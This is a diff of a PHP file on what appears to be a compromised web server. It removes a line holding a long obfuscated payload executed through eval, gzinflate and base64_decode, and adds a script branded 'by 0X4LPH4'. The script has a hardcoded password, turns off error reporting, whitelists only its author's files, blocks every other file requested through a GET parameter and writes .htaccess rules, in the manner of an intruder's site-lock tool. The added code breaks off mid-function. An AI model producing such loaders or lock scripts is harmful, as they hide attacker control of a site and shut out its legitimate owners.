@@ -1,1 +1,1104 @@
-<?php $Apaaja = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1KBrNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUMn0SyzJSMwLKMrMK85JrdRE\x41tY\x41";$iNathanPrinsley = "\x3d\x63\x61MXNterEVJ/RSZhPwH/kQ\x41/\x629gipVTjH12J5JjZyRsXQHrzvseKiwgZXFHUXvFyNh\x62\x63lzhxhsonkpq\x62Fj727E0Y\x2bWoxx3OPZstS7Luh3pF7fLKexlDJ/GyR\x41vLlD87XO\x61tPo4onOVuZDw9\x413F6NQtW\x42\x2bhwKMNg1Z\x42e52\x63u7s4fRmt\x41MrnVOhqy2zWxKME\x42NvplmkF5/qkJGK4qJ7M\x41leNpNVYF\x41\x41sLGjYvd\x63jHEkjiZOs\x42zmI\x2bQ5d0frwE5i5Nwn94432H/Go2n/Vw/\x425sIT\x62\x42syz\x42nRPeHuQxURn/yZVuqrzFyMimHOT\x63zyVVlIfL\x42eK9sXuRM0Tl4s\x62PkujOqVXKvN\x43M\x61PJw1\x61Jg/tX2g9\x61jRO\x2bmTG7Jh3\x43XmLmiLdV\x62lhE5d288D1WuWGu9h\x61zEKNIo55iRhSM7eV2oyhrhW0QLrR\x43dz500F5qJVXQPUOX\x41U30l5nXKir\x61xLP4\x611iN\x2b3MPYhV\x62MirWe\x63rpOgtfSS\x2bV3T2vJ/9I7xu339YeEHMR6Ot8eeh4wWU9dK\x62UpkTYmmI\x2b6v\x61n5G4zGW\x61kS6V/iPuxtRksfmDz\x2b\x43OOpfd\x2b//lv//xth9\x62uSShTeq0oijlXRho3I85OKz\x2bW1uu\x4110Sg4gx1HnuJ2It\x62kPPvYew\x2bpys0pTk9UswpHvo0\x42T\x42G35gq4v2J6p6kKZDh\x63\x42SdLNUk3Nzj3O50\x62z8\x41s6Qv\x622jgJynFq\x2b\x42gm23\x43IP\x2bi8ksf0e4RskIw996xpZ\x61Nom83LElOgrj\x2bmJrR2XmeXZjN1i\x41hvLg/fXH/q\x61F1omYYgP3K6387vg\x43e7m\x62UU\x2b/d6\x2b7Hfy0\x62\x63X\x42W\x63q5E4spN7P\x415QUI/HT5LhXTwFU\x2bGF0\x412z\x2b5pW/UYWUd5qf\x2bIMpKpOTdEvf9XKrh\x427nu/56U\x2b6mMRqTmD/1XKPwj/\x63FrD2STPMsz8megJ6zkguj2M841/\x2b7mFUS\x631hjDTx/WGZzOlR24lspthlXDpn\x61NQFGm4\x63\x61Ij\x43P8O34sjfN8m\x62kgsZTUOGK3ZMlu\x43V2\x63h4HKYzeoDw5\x2bD\x63qXK5lFTxJRsnuWEMloDduDtNg\x42T\x61wsQ\x2beJW\x42dvQXGJQ\x42d\x61idLmlfRRYKVkgULVWY\x42/Mzev9SSM\x63\x62O\x2bTOx44UtQJxoG5v\x42tr4qRF7Hd\x43\x61yZk1U/t\x43SivZSY\x2bFy7T\x611zDPzOlFPDDqnNFiMdrr\x635Ld\x43qglGR/YSyw3v\x43oP\x619Kyfw7nrTF4grtx0tmIhKXRPV//vu\x2bYP\x42pk\x43ZTV\x63QSkNUZ3nkEKPogr/\x63JZSy3yKNEF9igz9qJ\x43rInmr\x2be2\x62zr7fiSRjNqzZ\x42p1\x63wzlNu5xFlqklnqS\x42P95o10To\x2b3J\x41\x43HH\x42NWWQZXDlFH2M/Z\x63Xy1lPm0HH3/PP/torQVFvExVs\x61WVqGnVL2xUUi\x41pW\x62SG\x61yl/fuu\x2b\x6131P7ih439v7winxSVHF\x61w0\x61sI7\x41LhqsELp\x43T\x62FdUR\x62080m\x62m\x43FxOv0058\x43\x62j/hsMxfRp4rX\x43spwis6dXSYms9D\x61x2rK\x61OueV\x42gjXFftFtnle\x43\x61frK\x63oH3\x43T\x63EF\x435i/EFgwjYNq\x618V\x63ln\x61T/PfsWKre\x42q5XE\x41J5\x2bMKf58u4WSo\x41lpQ3IK6r0p86XX8KtK\x2bVqFXyuzj\x431guXMSGElw1dksIxF7UrEJS\x42qZPspk4m\x63txjtzP/T9iPOYK26YqW\x61F\x62\x425wh4sHYLW\x4384XeReZiX91eWnqYDK5x\x43Y5PrWw6mRnXghpZz\x43\x41WZIN5EMHMZ\x41qow\x631D0\x42\x61R2oNZGIkF1\x43QpxF\x61x1fHVoU1V/mPkW29KRqHun/PxmEH1m\x62GyE\x63T73f\x42\x43\x62L\x428rlqpq\x63qZOP44upGxFL8iO\x62JK\x42fUh\x62JvE7DxmVKr7KzfHVwUo4RVzW3KZUeH3UJe17gN3VwIi\x41LltYKURu7v75\x42Q5YlMRZlQ19WQqWezH4KfKiI\x625380mLisKZgz7FfJqvqloMFgk\x42gfW7GMw3IHyT9SWGRlISeFNX\x2bjIH6FShMXpw\x43glWVOIiHv7GhEF/sV2Khysyql\x42Wq6p9xu6U6UHRmXzT9yjxSlUGG9D\x42QQvvwiRlFv1Wq/F9TRhr/gy/\x434WRkxVe/iJyKKlnK\x435kTkFpTVFJVZq9QKpo8oXoYqmo\x61Q\x2bVlJZiQs\x63ttIYdWqz/8WPIT\x61Ld8qP\x62JqoDXJLi4VKEl0qI1UK39Vr\x2bkFogeLKVStOp\x6194RqigV5vkXYuEWWjHIRhKpwFq6pK8\x623lOVYY2jNWMd6QsEq0V5\x42K6IU5\x2bH/OZQRDlMlyTv\x622yZOTntIVnSGV0VoUlOOT4x78R\x628\x43N09gj5FLGlR1t\x41\x62mUp2rT7sM3uQ9dgTNr\x42OLNKSplXZJhpzpy3MKuWXE0eMY\x62KWXXWS8W6uyTmU4Vvwny\x63DLHvNq3SNX9n\x63\x61v9\x42\x2b0Vqrlkor6n4Oel\x41xRl\x4358\x62qz02hV\x63KjnGw5yM4\x63H6oj/KZmyew7kQYDeP3dTq/4omLO\x61T1zMGW\x42\x41y1\x43m/6LN3\x4347WiVee\x2bVoX\x62vS\x429RMmpfqU8Kmi7IP\x4335\x63yeLWpTTWk4eZWVYjp\x41tTpKtS3rTiVN4uU2nM5/J\x62t\x2bkxh9k1R9k5\x639J7yDKD5\x43UWS\x62fDe/gtP8\x2b37X1\x41kgUIy4hgSq8gTIpDPRJIXi\x43/71\x610Dvr80\x2b0ne8eVX0Rdjgw8LO/JFKj\x63vQs\x2bZSErUQKXz\x6110PH/7m/N6x/2fJ63XHV8vVi0X\x62qvg75xjs1L1L\x638Pe6\x43z/Vg4xn3\x42GdsqeWpxfF/YOWD\x2begez/U\x2b2x/MeK0n6ny\x42N\x61v\x2bwt\x63D3\x62\x2bKHPg1GG\x41DH67WwVOTRuelhmXm\x42DhVG1xfd0xXZOuNefiTY\x63yKTmDxmdDT\x41pQ7S2xWt4zUJYdz3dgNd1QLoPLGxW3\x62jGx\x41d4D\x2blxFd\x63z8uY\x42\x43K3KQMU4iSJiT\x41\x61mdtp\x2b\x62\x42Gvt\x61y\x42Px7kRzpyqzKsXhkLHUvdkPE\x41wLD\x62Pk2eG/mVpPW2OWRyMK\x432ElfM99\x63JUe58SymRn6566d\x610LQ\x63Noe3mnn6dXe29u0u8seNQ\x61QYvH3tzqYGHrEtHNNN\x63NT9hVW\x63/jTvo\x43rkKm02RIulHRM1prunqe\x63QjOQeiKKqVr9x6eY2\x629Dg\x2bw2U\x61Tef\x63ppYoY9\x42rXXk\x2bg\x41\x61Gfi\x62sN9ErsIxh8/\x61x54TDWNvXPD6\x2bSkPOf7DM\x41/\x2b8g\x2blIT\x63j42u13uVH\x2bWjl02V\x41\x61\x61NE\x2bQ6sTy7xRN\x2b\x41uu7ZpV\x63pHVs8k6y0krfMz9rKXojuk2qz\x63HPJifVOz\x61pzlXRzOmI\x2bPxy6\x63w7ev\x411W9FLYk\x2bWzq\x2bvP\x423P83nt1Lnv5H\x618sl\x432\x61zV\x62rtRFs0L6l8D7EDg521t4es2yZs/x9u3sWiPJs9\x61qIMj8ed\x63\x43ldGZ\x6340pZ55QHL8rpFgHdfux/uQNIqsSrwo6x44qn68UW04\x42d\x41KGqLNWNRqFeL2rkWMFDNHDDG\x43Pnwv\x43H0rP4402t\x63KJUyWe\x63RSXJOZk\x41Z7\x43EhrLX\x62eY\x43\x61V29l2ogZKKKX\x63pRFT7\x42E8hSn4oo08FmH\x42jvivj4X6RMm\x43tOseQgei\x426mNEPso\x417M\x42R\x43moFWW6FgjZG/M\x43RjMhSZHSM4Ff1ygXXyUtmELPDJRmzjW1RU3lR2STqTQ1LDJHSJXRPu\x62\x63D8U78oyoQvUMlKt15\x41YuvqvG\x42Ilmsn\x63gDvTokt0oMy1EF4e1ze\x42h\x61sV26gD9QgseDHweN\x611wz\x427Z7KjVEQi2fM8\x42\x6167\x41Rf\x63t6pvlJdE\x62qXiHp\x43lVFo0\x43eKsNqZO\x62o4N\x63\x431HLW\x2b1XmZ8vVTxlX\x618xPu8u7vuJu21rO\x2bdfvR4pONg1p\x42t7dv0qFYst9ys9kR\x63wqMqKdmXl\x42lYX\x63JuUJ5XizIlk35rJfWFwg\x42q7V5QGmi\x43FSVnj37QJo7HFnM1sHsqrooDe0JHr5KzOZJPOmSJJQzlRdTm\x63Ng37\x631UIqEP\x63lzFDU\x63nuODfQY\x61q8JeY4FX\x43\x2bYgllVUGyFo3jpdYsE7VSSJilZKrqm9Z1gHGDL74UW0Gv/KxFWHPqG4\x43p03J2\x63zzjPpg4\x63ow\x637Fy6LdP91xTY\x62tmkh9S5tZo\x41pLvRt\x2bhnq/SX077\x63ktjQ\x42zDDW\x612L\x424\x61o1\x42g\x42Hdfh\x63m7EK\x2b3FW\x62O/JT4Y\x61X\x43hRS/8xUVhlzU8EwKHxX2IDnk\x2b\x43Hi\x61dvM\x62tkg73o38nwZFeGIyon9w/RM/35Q5Pi90tW2\x61eqUo8nhK8hQg63PH5/\x42iEdOvjQPSS29MVkE\x625GTre0JgS04PQ9OTpDO9FqW\x61\x61LO5m\x61gQf\x42KVpl3pmV3L5svJVy8GIWiEOH30K5fUe\x2btHP\x61v/xTp\x639/sXN0FwIVT\x63Wh9RUOoY54MfFuUEhp\x43H\x43NmsStrewXRtHmxnXN3t0\x63uwlX\x2bG\x42vjLDReofpY\x42V\x61u5Lijmw/6I/\x42\x43Q\x61wj1Z\x62qSXLIK\x62U1J8WSowT5FN5u4ljGZdPHSyDPH0YIYW\x2b1HgMjRgWXJoSuNw\x42DthFqIm8mrU7NEes1\x62dzDZN/hjft3\x62Yk8jz\x2bm8L/7hdI\x62vFuvYzRqX5z/\x41V1s0/R\x61mvKjn812q3GiW3j8lTjR0\x43Xqh5\x62TS\x41YgQElpIVp\x41TpoeFXtWSoLo8FOWX\x62H\x62J4Yzlp7ZdIQJe\x61mG6YJ\x41mXx77u\x42YKu2mqZ5Vqt35ehQlreG\x635fxZK/QVhkYymnZw\x619\x2bonfkVlLx\x61q\x62poKt\x61dWW\x2b6LFKgMeL0yWqt\x61WVJo6S7Y\x42QzKP\x4196nYYWSll3\x61uZUzqHdJkpYt7dIvnJxN\x42M3T7/\x43zHU4Q0PD3Oo0KLOU6Pl10\x621M\x2bF\x42\x619XLHDH9M5h5U7pMm\x63\x41Uh1v4pIl7r\x43rI9qJrry5Q3K7x\x43HtNpOr6i2\x41zV\x43\x6167XPOzl\x61J\x42w4r1L4POqGe0S\x63gD78X\x2b1hES\x612\x43\x2bv\x421WwKKskTYp2iqSVk\x61SSe5TlY\x610OUksUXFxsgMRv\x2b\x632g6lWRTLvzq47rfMLNJIN6\x41H5p\x410LsWhHo9WqrSmFzxM0I0I4Y\x43DnOIlyDuG4Oe\x42fKJhqKIXLqS8N\x2byVVwezXfF\x42LtWsyiUjtSVFHF\x2bjyXtVWdgVsl5siIkUNMrF\x61mnMOU3QmJ\x2bWzzzILr5S\x63dQVVy8dV0Ff\x61\x2buL\x63\x41yS2\x6386Y\x6146Jd06vYYF46g\x43vgH3Fph3zSTqe\x2bXhp5DG\x62WtVVPM\x41wKXLLJok\x635\x41Mws8Po\x42OUovOrU\x62\x42U\x63L\x41IJy5w\x2bT\x42JtYIqHI\x41SW\x62UlEgSZKeX3k175\x627YxGG1SS1MuX\x63\x63VFDxV1TOexT0R4VwYjKTzT\x43eyfgD3iPxoMqegmts9lDHR\x41Wdu\x42e6mm5EXLKJ7n\x43mLRvTnmgk0\x63qgG7N\x436Tz8zrR5tvZxir\x61\x2bNK\x62\x2bFFRxlK/Olp3NR\x2bjHPDkMp2WsF2YuVo7MZlP8PNPE5KIuvF9TfpoZ9r3d3ZxYqG6EMEm\x43Mx/W2\x63zV026PwZ\x62oymU3nTn9rq\x62U\x62Px\x62n\x2bdhe3j2dE7viJ\x63dP\x61K\x2b1szgKxTy0\x431qk9w5ymJ2\x62IHToR3K6NH7Ym0lL5\x63LJReGih7IG3uQ\x41iZ\x43Oj31ReG6\x2bkf\x42dtlZWZNpt6qe0v\x63sG4xUuK\x621PruUum\x63e\x61/o\x6244gNwDMhYE0NgUF5ri5Y72ET/JSySU2zYWSZSu0viEwgEE\x43sD0mg0Kq5GnPMHyF\x2bUVMIjFU\x42KsUKM\x63lLlIH\x43MvlY/\x43\x62fZ\x617ZKXe7UUxYQ9eE3x9U1XXI\x43hz/lxQ3MgwYqm\x41gKWyJq\x41mEFvIyWUTor6kuL\x2bGu0\x43dNDp\x63Hz5/E\x42PFidmT\x63UM\x43lTlnSfxT55dhMXJNJZ\x42HZWYQ8z\x63X\x43ypv3Zt\x41kETHx0E63XJdfU\x41\x62KtQHu7OmPjw\x2b8zOL1Gd\x61hRMrFWSLesdRsMqKg\x2bpwI\x2bRmG\x62Z\x41zFf\x41hGj8RkLS\x41dVwrQXT20YUzs6J\x61\x42kF6T\x43RP4gUQNFdlzTs6hw69d\x63LLokylQu/LYiyTrGp9E4yidmKVWtZnzozEHDXuSRKd\x62J2juL\x431\x62tneZxL3\x62JVhzNhfDeX\x2bTToNR4\x638\x2bP49zP\x42k6\x2b8/YuplEnjjG\x6139gT9i5zZQpPsNj1TtZMJ\x412QiZHreSwQ3lKNsS\x63\x62q\x2brWv40FgN3ST\x61jQk\x61UK13J09DLE9L9N3\x41\x638ZegLYK\x414gyQYD2wY/ypO5\x626mhFMWUpKOJ\x43OGGJy9s7xYR8\x61oY5hX\x42W/Fwm204GMsxsxw\x614IPK\x43o/VPF/zLY6oXQP0\x2bdXZPf842dW/k3p7U9P\x62GOwM\x2bh0Z3w\x61qthwG3L\x42tj2h\x61u2\x612fUEmvvwfkoFv\x43\x432i\x63IdIk\x41W\x42zXoFQLTh\x41LeD4sqXtR5kLOxu1tRhuONj\x61DJ\x42lVlIk1s2\x62WVHeqt7JI2yQ\x41oIykY\x42ROD0z\x62UOW\x416NJjKUQgyU3my1i8QIKhiS\x41RySKlk9\x63t\x61\x43TUg\x63sWsQYT/\x6268v1D0QDZo1\x63HuwdyiS\x61OHQoVKleEE2ThWkk\x43IdYSynYS\x41TerRoE\x635Lm6r5gmlieSGQop\x41R0dh0EMj\x2bRRN\x42\x2bo4M1UQ7zWuvS/JjGFWueJR\x42VmF5xdKJ8S8XOUDVZo\x43k\x61gJZqEqGuRsErVgErkS9\x61\x41U\x42v8\x42X4\x2b\x42GkS8LoVkp\x43miqJQi\x2b\x61\x42\x61\x42f6wln\x62\x43\x61\x2bXOx3\x43l\x43d\x43Y\x2b3lsRSoFxTwUUs84\x62YVXsM\x2bY\x411LYyhJ\x435RYg4Ne/DD6UFLffPFVPQ23MZWE\x63ZhnLhL8TRSxrX\x43\x42Zq\x43OJH2Z9g\x632\x61xTl\x43\x62KYUSMFDdjde1IEvkiG\x626slUYLEZhVT1E9vTdDFePxO8v1ltj\x61lFXdrnOsxK0G0TH\x41WF4vkiPXLM3\x63TZWxEyMLz\x41wEtS2RMY19PppDRKmGp2msV2i5kTSeIZoMx7X\x2b8ylFSl\x2bSzeou5r\x42et7Y\x42eOZJkuH5JrRJJ0YItq2g8vu69xdRNIDqXrQyMYIHSdz594fIdyeMmN8\x43NV8KRLtE\x43Mql0g21VvTJR5i0dX8zxF9hgny5tilEZXN9Z4kUL5sgNvWJxIx4WSH9\x42OIijeQ8n\x63WoHjRpQLLkysPpwsGKTdODx2wuiYT\x63TlYyYQTSJEo9\x41jSHlWnFNsLt\x43WOXxNW3JON0m\x63\x42/F\x2biRu\x42zwX4Dd\x42\x61XU484\x43Z/t\x41\x41sI\x63\x41SuoNmOu\x43gU0sKI\x61\x41r\x63mDuVW\x2b\x43PM\x41Lhp0SWGxP\x2b6\x636sXZYsZiZZeXEg6UWjZM\x43Iqj3qII4\x63\x61wk1DkJTyz\x43r2UUko\x610p18\x428TMyy2h6SwN\x63/pr\x61svNEMwTqou6iDdG8NjOvtT6MUH\x41EwZ\x42MpZp7kQPUVWTUWlxUnFQogmy\x61JiQpIGg\x63t\x43yYMeJFm\x62et0/qKpHWuYQIZo\x63lMki\x42rMq\x61dZVNqXQiIgT3TeWVGgM6vG\x43Pe\x2b02pZ4Ol8396/3nE\x43RUriU\x43\x2bZHMu\x63dzvSNjm0\x42Li\x2b\x42xzEwqYuu7ttUo2q7jx92d\x43NOlVrFJ0XF9\x62\x43\x412u7OTV0gsM/\x42qphp4qDOzr\x62v4\x633Ul\x42p5u10F0w6\x2bSrZ9\x61jGnVSgk\x61u9Gn\x416dwjHJ660LXYuKP\x63v9SkpPLpFYt5\x614DUJLoWEvP2J5F47/nnve\x610\x42MDehj\x61oWGLH\x61w2dt\x41xXe\x415vXrT\x2bGIuHXIdsle7\x62NqfxM\x418sqWnD8\x41Q\x61vhF\x43yr5YYOunz\x424nfxrQihS\x2bTKzp\x61u1fvTvwTs1PPwvGJom720t08XN\x62WfZ/J1uQ/51joSUX\x63\x2bYk6SZXSFv8\x62\x61QTo2lwqUWKM3Skxi\x61026/oF08Q1nuW9xlXqoZsZlptF55FGQL\x2br\x42Rd49K6x6X\x4117I\x62d\x41N6iXsr5wT\x63mWMnOKgifr69hZypTz9jR0\x43rt/GXzzLQ\x61SQ/r58lh8V\x62seqs\x62NuIr9qZyF\x42H3\x43P5nP\x62wEyg1v\x63Nh6s\x42K7Y\x624pe8FP\x2bsl\x63\x4344rNmorDxGes0\x634vWnrpNQ\x62rOFqz5RTi1rt3\x42Y1/gv7KmrWrF0q\x426Worq5M9lLu4SDLUmwkWTuG4ZVyv9n5Iz\x61gOmwwN\x41636S4zjT2ipJNGvg2\x4294t/lr9GixOprxxylP4GsW\x62WztX9EwY0GVT\x61j\x61mTw/k\x42Kxo\x62f\x6160\x634F0J2\x61vvh08K1sy\x61rqvQNY4hyt3G98\x2bWUuKY\x2b64v6Ys8EP17dVQ5UpOi9tD\x41yPH\x63H\x61sZnyqVdEH4NI52emVK\x63i\x61hLGjK8yQv\x2bul53\x4386NJEuiqD\x2bfLWoeD4SlLI9hpySF\x61rl232/\x2b\x618xm6\x41IR\x43zVdZweJSxru3gEXtKFkT0\x2bgHF8oQ\x41P4rTHhg70G7SslW2Ugxiihwz6q3F\x42guX//h5\x630JP\x2b\x61yx/qt8rttdUwwj\x434Q\x631FWh0spen\x62\x2b3/x\x61\x61KodgxUqLL6zUWEH\x43h7I78hs5G9Ge\x2b\x41\x2bw8K\x2b2wX\x436Rr2V95752/v5e\x61lIf8S\x63\x41t0\x42X\x632pUYv\x62g9NWULv6SyQrQkJmKOdr\x429Nmhp\x42o\x63uEQQiZPMVNxlNZwE5U4ws2t\x2b\x42vyxn00\x63r8V9r8HeoD76I\x63F\x42H58WzGY/yl5qp0fDD8D8Rh\x43uz6G1w\x61gKK\x61mi\x61eF\x43l1HVRlkD\x61p\x61ij6J5Z0usx/7\x62S\x627oQQP0\x41EP6DXQp5s0JZnv5TNY6svn8lVK1m9N4DWhQhQOqpIRD6j\x42On4I5niQHLZ\x41dGgpSQU\x63TV\x63\x41w7zN\x41qvfpt3VoOPWmHL9d0mSD\x421F6I4U0l9wV4MjyqOGxE3L1PjqYPmEH9w0fiFGoEUxDmUs/2yPXtOR\x63n\x62\x62fyF7jgSnXDP\x43KSe\x43YwpK\x63\x41g\x4265v\x43oGOI0\x41SH\x63TlsLtjGDyeo6ml\x43G8LwO\x43t\x42z\x41iv\x41pNToQ9QY4nlUq67Fmzg\x42uGMiWUHv\x41\x43I8JEK0xT\x41\x43KjT\x63Fhskzlv5r3EJHdYTuve\x61\x434O1SeREvh\x620HTIxhZS2\x43L\x43\x43XwMM6\x42O2JwxyzemSqM\x6263jY7E\x43tPsuq1RVOy/NXRoNqmzK02GNhTFYwIPx\x42TVyz22w0quG\x42Zt7X\x61\x61QHsf\x42quMmEVVRHTm5kjh9e\x41GyT/5k41\x63tvlwQqxk/wNk0StKhxoS1\x42jWMW\x63zun1\x61J\x61zO5Qh\x43fSk9W63KWhJQHDE2n0m\x42\x41\x63qUiDWdY6k\x614xsjJ4tU5l/773yp3D0O1x0O\x42q\x61\x42DoMHJjdKiHV\x62\x42QP\x2bxstpG9tHPdy\x41QS7siM\x63mswt\x62s0\x61xFwNXeiLprg5Dgep\x41f0HIUOWnQouyM5dgsY1Q7/1iRS8l/m9J3EoxK42gqVr\x42xHQQfy2q\x41UmWqwwR7XU\x62e\x43mXUE\x42z\x41m/ZhILuQeH29D7UhGED7E\x620\x63IhS\x62ZY\x436\x61DQVYMgXPNH1ZTtuXM\x41xS/Q0\x63dEptF\x63q3z\x42G3TF\x62pxHPL\x61knYm\x43\x42/WEghf\x61tOUE\x62Q3\x41jPE5mG/17tPT\x42XLYXu2KyW95IoKZ3k\x61u\x438uHsTZeh1K8y\x63FO70tfX40z8lxm7gjUzDYdPSi0jxT74J8G\x61DR9nf42nVyPoFiR\x61H\x43p3iVYM8jiZ5p\x63tYf3SPlJL3HqkI\x633Ow5WiOT\x42nOk6EOsne\x61Rd2\x41mtv77Tm434Y\x43wE\x2b\x61Tif\x432Z\x41M2ZXDq/1j/N42/XTWOu19QX4\x2bfQuLNE1\x43WtXYt0fFysfZrDm\x42zeHO0\x429\x2b4\x41\x41HfQDKWIx6FgH\x61Mdpeg7R\x43\x42gfXseJDsotMIo0hTFVi\x2b9FXh2e\x2bQQ7QE2MK6Y5\x43QHTE1YW\x61E9foV675LS2wVPeqsw\x414dtZ\x63hxnLdTuniJT9SUJY\x43L6\x2bxVQToHkZeSOXlk\x63KMStIrFPNNLI9J2gsdNlggwRGrSkYmmjYG7R5Tte/fq3KU\x626t\x43G\x42m\x42GQ0D\x2bw/L\x61\x41DFz3lsNl\x43S7\x62JIiTXvPlShn\x4329RTP0ushg3e4o7Ky\x6301NGnZVDM\x42S9iVkxn8\x2b8l24MmV4p\x43dYu/8\x41VopjWU4MEKRQOdijGHUQd\x63E\x62mnJmpgnRKStT\x61ImVKRFX1Eu6F\x41j1vyKP\x43rkF\x43IoH\x42JowkmYIv\x429Jn\x618\x42LkyEO3\x43\x41TDXJwlg\x41ihPWHxqUJU4MenM9NK\x61\x41S6RDiFdyU\x61\x61ETwnYlIe\x61ph1ZhwSGU\x41iFWENEeosPwV\x41\x41Dyd\x410\x42jg\x63tgP\x41KKjTOJgd\x612\x439VZszKN6JdXx\x41KN12k6\x2bE/Y00Fpx\x2b88KO/96p6NG46hyheJEd\x61U\x43tGh\x41d\x61sxx\x41y\x63XLMOG4\x62h\x43eQL\x42mtYM\x4238PIkiLzo/KfNrrXgd\x2bm0ze7s/l7Y/zf\x63nj28Y9dw\x61W/t7fMYu\x43Hx\x61i7IZwe\x61J56T\x42W\x63jWT\x62\x2booDyUQgHhLgy\x43t3RkhJkxidkdOyFTOZtnPIK\x2bg\x61iTlJQE\x62ksQtx48IUe3voeKkMF\x61xOV8YS5NNO05ttg\x2bNOIfLG8Uf3\x61LwL\x42U0i1kh\x61zUgqwmL18QnVySvfN/7u5ZT\x412zxHTf7u6u\x63\x61OEgVZyqV\x42\x41HZSrxxHhV\x439T4yv5WT5SKZPI1sipJ\x63yg06g\x62h\x41\x62SXz\x43zezh/r7TQgKTo\x62Y\x62YE5ijL1efv\x42zpPQWmwUhjQYdT\x43E0\x42qZdVizkX\x62Q\x41/nYEwuJMMSyF\x618Kmx7FKH\x63/\x41eoNkLgYjhxjMRH\x43vDm7w/2\x61Kh\x2bKNywNK0Ih0x\x43iH4Vj\x41fFHnE8vItw/O\x417p21hDRYrROUX\x43S\x2bGy\x43uOt2\x43hoj\x63lI\x61Z\x43\x62\x42Yx94\x61ZiOR5UZ5/g3p\x63z/4VvTudyzSG\x43h5/iL\x41IOJX/Ev3g\x430U4\x42d3lj8KKY42dyEZkpYgMeNOE\x43Nwu7ezg3j5KUj3\x42\x41RXS114kYs\x43IUQO1\x2b\x61GEV\x61vRsj\x62dfD5KeTo\x62pzE\x613PyU4M\x2b5uTGnl7oWf3RkPi\x618xQVuRK25JIxYku1eZoFpDtQyvvM5\x61DqU0ljHFxEL88L2n6RJ4Jy\x42/XmUu\x41vM4QwlL2ddMsh\x2bkH\x41fSyGQQPFYE4jP/\x62uEgj\x43jTXkFI\x61k\x42r9DvQ0LvgNG4Jt\x61iMSNgngDX3Tg\x42J4uuvjkN\x43U\x2bQwG\x43uTHI6e46ir7JGDxlSnwEX\x416OMH1\x62x\x42iPjhM3xe92O8J8W7r\x63uh/sNsoJ\x2b\x2bg\x42/7K1YPNQrf\x422\x63f4f9XTMMf\x2b\x2b\x63lZzoErxu6tZfU/Ro5P\x2b6snZ\x612I9I2E87GhDHRqPyt\x43KlN\x423/tgX\x637jj\x4135SOrXUeldoXfQLD82lr25LEzqLH7Klod\x42otuzJUpGSHK9oewVSV2o0Me5SQPDun9u4YDed3TO9QZLjGu4qj\x637hHu6q9MTE\x61tITNoP49D2\x2bi9s3p7d0\x2bFpI\x61\x2b/\x2b6hyT/R\x614Y\x2bk\x431R7tzV9q3D29i9fyuHe3\x41HKpY1R2W\x61l\x421\x2b2\x623De/E9fxG7duO0vZWrn\x4304niM/4t5Ftw\x41m4ovGf0mxsE4\x632JFs\x635N6mh9Hm2qO\x62uwgQzD\x43LuVVE7lqE73PsRR\x43T\x61ojfOi4K6MqDF6o\x61VEq\x63Q/PGqVZwZsQ9Jg\x63D3URI\x437ytIkUU\x63H\x62K8T\x41Iyff/W\x62\x61Lzld\x433PDOs9Uk5XPr\x616re4unu\x2bdxT61\x62nw7HXr79ked/ns3\x2bH\x61\x419O6PHuzp3PtLY/7V7T\x43p/TR2u19xj\x61yp0xD7Zne6unu7pn\x61KYJYRXL0LpgiPM\x42\x41IDPTHh\x2bj8H\x63fP5PYevd3GVX\x2b\x43J6KpHTh\x63eqkLX\x62kQI\x42Wwjo\x43\x41\x63Ds\x61WkpulRzyl\x2bUnI0VJ5VuqWyrPkrI9S9NHG/JvrvLHS\x62PXX9083u\x42Sk\x42wJefPGI\x63Gw3e\x42So\x42wJefPFIsGw3O\x42Ss\x42wJefPEI8Gw3\x2b\x41Sw\x42wJe";eval(htmlspecialchars_decode(gzinflate(base64_decode($Apaaja))));exit;?>
+<?php
+// ============= INSTANT BLOCK SECURITY SYSTEM BY 0X4LPH4 =============
+session_start();
+
+// Disable error reporting for production
+error_reporting(0);
+ini_set('display_errors', 0);
+
+// Configuration
+define('SESSION_TIMEOUT', 1800);
+define('DEFAULT_PASSWORD', 'GeoDevz69#');
+define('SCRIPT_NAME', basename(__FILE__));
+define('ALLOWED_USER', '0x4LPH4');
+define('ALLOWED_FILES', ['0x4lph4.php', '0x4lph4.html', '0x4lph4.txt', 'index.php', 'index.html']);
+define('BLOCK_EXTENSIONS', ['php', 'html', 'htm', 'txt', 'js', 'css', 'jpg', 'jpeg', 'png', 'gif', 'pdf', 'doc', 'docx', 'xml', 'json']);
+define('SCAN_INTERVAL', 30); // Seconds between scans (30 seconds para hindi laggy)
+
+// Initialize session data if not set
+if (!isset($_SESSION['login_time'])) {
+    $_SESSION['login_time'] = time();
+    $_SESSION['last_activity'] = time();
+    $_SESSION['last_scan_time'] = 0;
+}
+
+// Check session timeout
+if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > SESSION_TIMEOUT)) {
+    session_unset();
+    session_destroy();
+    session_start();
+    $_SESSION['authenticated'] = false;
+    $_SESSION['login_time'] = time();
+    $_SESSION['last_activity'] = time();
+    $_SESSION['last_scan_time'] = 0;
+} else {
+    $_SESSION['last_activity'] = time();
+}
+
+// Initialize protection BEFORE login check
+initializeProtection();
+
+// Handle blocked file requests FIRST
+if (isset($_GET['blocked'])) {
+    $blockedFile = basename($_GET['blocked']);
+    $filePath = getAbsolutePath($_GET['blocked']);
+    
+    // Block file if exists and not allowed (REGARDLESS of path)
+    if (file_exists($filePath) && !isFilenameAllowed($blockedFile)) {
+        instantBlockFile($filePath);
+    }
+    
+    // Show blocking page
+    showBlockedPage($blockedFile);
+    exit;
+}
+
+// Login check
+if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
+    showLogin();
+    exit;
+}
+
+// ============= PROTECTION FUNCTIONS =============
+function initializeProtection() {
+    // Create .htaccess if doesn't exist
+    createHtaccessProtection();
+    
+    // Run instant scan on initialization
+    instantScanFiles();
+}
+
+function getAbsolutePath($filename) {
+    $currentDir = dirname(__FILE__);
+    $serverRoot = rtrim($_SERVER['DOCUMENT_ROOT'], '/');
+    
+    // Remove any query string or fragments
+    $filename = preg_replace('/[?#].*$/', '', $filename);
+    
+    // Handle absolute paths
+    if (strpos($filename, '/') === 0) {
+        // Absolute path from document root
+        return $serverRoot . $filename;
+    } elseif (strpos($filename, '../') !== false || strpos($filename, './') === 0) {
+        // Relative path - resolve it
+        $path = realpath($currentDir . '/' . $filename);
+        return $path ?: $currentDir . '/' . basename($filename);
+    } else {
+        // Simple filename in current directory
+        return $currentDir . '/' . $filename;
+    }
+}
+
+function createHtaccessProtection() {
+    $currentDir = dirname(__FILE__);
